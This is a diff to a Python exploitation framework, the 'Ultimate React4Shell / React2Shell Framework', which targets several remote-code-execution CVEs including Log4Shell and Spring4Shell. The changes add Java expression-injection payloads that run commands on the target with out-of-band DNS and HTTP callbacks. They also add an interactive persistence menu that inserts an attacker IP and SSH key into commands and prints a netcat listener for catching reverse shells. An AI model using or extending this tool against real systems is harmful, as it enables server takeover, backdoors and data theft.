-        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{dns_cmd}\\")}}}}"}}'
-        
-        try:
-            if method.upper() == 'GET':
-                params = {"query": payload}
-                response = session.get(endpoint, params=params, headers=headers, timeout=5)
-            else:
-                response = session.post(endpoint, data=payload, headers=headers, timeout=5)
-            
-            print(f"    Request sent. Check your collaborator for callbacks.")
-            time.sleep(2)
-            
-        except:
-            pass
-    
+
+        for cmd in [dns_cmd, http_cmd]:
+            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")}}}}"}}'
+            try:
+                if method.upper() == 'GET':
+                    session.get(endpoint, params={"query": payload}, headers=headers, timeout=5)
+                else:
+                    session.post(endpoint, data=payload, headers=headers, timeout=5)
+            except Exception:
+                pass
+
+        # Poll OOB server for callbacks
+        if oob_host and _oob_poll(oob_host, wait_seconds=4):
+            print(f"    [!] CONFIRMED: OOB callback received from {domain}!")
+            return True
+        else:
+            print(f"    Request sent. Check {domain} for callbacks.")
+            time.sleep(1)
+
     return False
 
 def aggressive_waf_bypass(target_url, endpoint, method='POST', payload_template=None, command="id"):
@@ -1615,12 +1864,27 @@ def _build_payload_from_template(payload_template, command):
     return None
 
 def _send_payload_request(session, endpoint, method, headers, payload, timeout):
-    if method.upper() == 'GET':
-        params = {"query": payload}
-        return session.get(endpoint, params=params, headers=headers, timeout=timeout)
-    if 'Content-Type' not in headers:
-        headers['Content-Type'] = 'application/json'
-    return session.post(endpoint, data=payload, headers=headers, timeout=timeout)
+    """Send a single payload request with rate limiting and audit logging."""
+    # ── Rate limiting ────────────────────────────────────────────────────────
+    if RATE_LIMITER:
+        RATE_LIMITER.acquire()
+
+    resp = None
+    try:
+        if method.upper() == 'GET':
+            params = {"query": payload}
+            resp = session.get(endpoint, params=params, headers=headers, timeout=timeout)
+        else:
+            if 'Content-Type' not in headers:
+                headers['Content-Type'] = 'application/json'
+            resp = session.post(endpoint, data=payload, headers=headers, timeout=timeout)
+    finally:
+        # ── Audit log ────────────────────────────────────────────────────────
+        if AUDIT_LOGGER:
+            status = resp.status_code if resp is not None else None
+            AUDIT_LOGGER.log_request(method, endpoint, status, payload)
+
+    return resp
 
 
 def _strict_verify_execution(session, endpoint, method, headers, timeout, payload_template=None):
@@ -2282,15 +2546,17 @@ def establish_persistence(target_url, endpoint, method='POST', payload_template=
     print("\n" + "=" * 70)
     print("PERSISTENCE METHODS")
     print("=" * 70)
-    
-    for i, method in enumerate(persistence_methods, 1):
-        print(f"{i}. {method['name']}")
-        print(f"   {method['description']}")
-        print(f"   Command: {method['command'][:80]}...")
-    
+
+    # NOTE: loop variable renamed to 'persistence_entry' to avoid shadowing
+    # the 'method' HTTP-verb parameter from the function signature.
+    for i, persistence_entry in enumerate(persistence_methods, 1):
+        print(f"{i}. {persistence_entry['name']}")
+        print(f"   {persistence_entry['description']}")
+        print(f"   Command: {persistence_entry['command'][:80]}...")
+
     print("\nSelect method number to execute, or 'custom' for custom command:")
     choice = input("> ").strip()
-    
+
     if choice.lower() == 'custom':
         custom_cmd = input("Enter custom persistence command: ")
         exploit_vulnerability(target_url, endpoint, method, payload_template, custom_cmd)
@@ -2299,21 +2565,18 @@ def establish_persistence(target_url, endpoint, method='POST', payload_template=
         if 0 <= idx < len(persistence_methods):
             selected = persistence_methods[idx]
             print(f"\n[+] Executing: {selected['name']}")
-            
-            # Для некоторых методов нужна дополнительная информация
+
             if "ATTACKER_IP" in selected['command']:
                 attacker_ip = input("Enter your attacker IP: ").strip()
                 cmd = selected['command'].replace("ATTACKER_IP", attacker_ip)
-                
                 if "YOUR_PUBLIC_KEY" in cmd:
                     pub_key = input("Paste your SSH public key: ").strip()
                     cmd = cmd.replace("YOUR_PUBLIC_KEY", pub_key)
             else:
                 cmd = selected['command']
-            
+
             exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
-            
-            # Для reverse shell, подскажем как слушать
+
             if "netcat" in cmd.lower() or "dev/tcp" in cmd.lower():
                 print("\n[+] To catch reverse shell, run on your machine:")
                 print(f"    nc -lvnp 4444")
@@ -2321,6 +2584,7 @@ def establish_persistence(target_url, endpoint, method='POST', payload_template=
             print("[!] Invalid selection")
     else:
         print("[!] Invalid input")
+    return True
 
 def file_operations_menu(target_url, endpoint, method='POST', payload_template=None):
     """
@@ -2680,7 +2944,7 @@ def main_menu():
     """Interactive main menu"""
     print("\n" + "=" * 70)
     print("ULTIMATE REACT4SHELL / REACT2SHELL FRAMEWORK")
-    print("CVE-2025-55182 & CVE-2025-66478 Ready")
+    print("CVE-2025-55182, CVE-2025-66478, Log4Shell, Spring4Shell, Text4Shell")
     print("=" * 70)
     print("\nOptions:")
     print("  1. Scan new targets")
@@ -2688,7 +2952,7 @@ def main_menu():
     print("  3. Direct exploitation (manual target)")
     print("  4. Verify RCE (check if exploit is real)")
     print("  5. Aggressive exploitation (WAF bypass)")
-    print("  6. CVE-specific scan (2025-55182 & 2025-66478)")
+    print("  6. CVE-specific scan (all 5 CVEs)")
     print("  7. Hybrid exploitation (all techniques)")
     print("  8. Advanced persistence")
     print("  9. File operations")
@@ -3007,7 +3271,7 @@ def main_menu():
 def main():
     """Main entry point with argument parsing"""
     parser = argparse.ArgumentParser(
-        description='Ultimate React4Shell Scanner with CVE-2025-55182 & CVE-2025-66478 Exploitation',
+        description='Ultimate React4Shell Scanner — CVE-2025-55182, CVE-2025-66478, Log4Shell, Spring4Shell, Text4Shell',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
